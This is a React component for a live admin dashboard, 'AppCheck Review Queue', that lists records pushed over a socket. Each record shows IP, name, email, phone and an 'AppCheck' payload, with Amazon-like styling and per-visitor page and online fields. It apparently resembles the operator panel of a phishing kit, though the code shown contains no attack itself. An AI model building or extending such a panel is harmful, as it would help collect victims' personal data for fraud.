import { useEffect, useMemo, useState } from 'react';
import { socket } from '../socket';

type RecordRow = {
  id: number | string;
  ip: string;
  time: string;
  fullname?: string;
  email?: string;
  telephone?: string;
  page?: string;
  online?: boolean;
  status?: string;
  appCheck?: string;
  updatedAt?: number;
};

export default function AppCheck() {
  const [records, setRecords] = useState<RecordRow[]>([]);

  useEffect(() => {
    socket.connect();
    socket.emit('join-admin');

    socket.on('admin-update', (data: any) => {
      if (Array.isArray(data?.records)) setRecords(data.records);
    });

    return () => {
      socket.off('admin-update');
      socket.disconnect();
    };
  }, []);

  const rows = useMemo(() => {
    return [...records].sort((a, b) => {
      const aid = parseFloat(String(a.id)) || 0;
      const bid = parseFloat(String(b.id)) || 0;
      if (bid !== aid) return bid - aid;
      return (b.updatedAt || 0) - (a.updatedAt || 0);
    });
  }, [records]);

  return (
    <div className="alz-page">
      <div className="alz-shell">
        <div className="alz-top">
          <div className="flex items-center justify-between gap-2">
            <div>
              <div className="alz-badge">Admin</div>
              <h1 className="mt-2 text-xl font-bold tracking-wide">AppCheck Review Queue</h1>
            </div>
            <div className="text-xs text-[#b9c5dc]">Live admin feed</div>
          </div>
        </div>

        <div className="alz-card">
          <div className="alz-section-eyebrow">Records</div>
          <h2 className="mt-2 text-2xl font-extrabold text-[#0f1111]">Submitted AppCheck Data</h2>
          <p className="mt-2 text-sm text-[#565959]">Live records pushed by `admin-update` are listed below.</p>

          <div className="mt-5 overflow-x-auto rounded-xl border border-[#d5d9d9] bg-white">
            <table className="min-w-[1200px] w-full text-sm">
              <thead className="bg-[#f7fafa] border-b border-[#d5d9d9]">
                <tr className="text-[#565959]">
                  <th className="px-4 py-3 text-left w-32">ID</th>
                  <th className="px-4 py-3 text-left w-44">Time</th>
                  <th className="px-4 py-3 text-left w-44">IP</th>
                  <th className="px-4 py-3 text-left w-44">Name</th>
                  <th className="px-4 py-3 text-left w-56">Email</th>
                  <th className="px-4 py-3 text-left w-44">Phone</th>
                  <th className="px-4 py-3 text-left min-w-[520px]">AppCheck Payload</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#eaeded]">
                {rows.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="py-14 text-center text-[#565959]">
                      No records yet. Waiting for `admin-update`.
                    </td>
                  </tr>
                ) : (
                  rows.map((r) => (
                    <tr key={String(r.id)} className="hover:bg-[#fcfcfc] align-top">
                      <td className="px-4 py-3 font-mono text-[#007185]">{r.id}</td>
                      <td className="px-4 py-3 font-mono text-[#0f1111]">{r.time}</td>
                      <td className="px-4 py-3 font-mono text-[#565959]">{r.ip || '-'}</td>
                      <td className="px-4 py-3">{r.fullname || '-'}</td>
                      <td className="px-4 py-3 font-mono break-all">{r.email || '-'}</td>
                      <td className="px-4 py-3 font-mono break-all">{r.telephone || '-'}</td>
                      <td className="px-4 py-3">
                        <div className="font-mono whitespace-pre-wrap break-words text-[#0f1111]">{r.appCheck || '-'}</div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
